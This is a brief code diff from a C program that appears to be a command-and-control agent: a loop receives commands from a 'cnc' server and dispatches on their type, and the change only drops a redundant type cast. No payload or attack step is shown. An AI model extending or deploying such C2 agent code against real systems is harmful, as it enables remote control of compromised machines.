@@ -35,7 +35,7 @@ void start_agent() {
 
   while (1) {
     res = recv_from_cnc(CMDTYPE_BUFSIZE);
-    enum cmd_types cmd_type = (int)res[0];
+    enum cmd_types cmd_type = res[0];
     free(res);
 
     switch (cmd_type) {
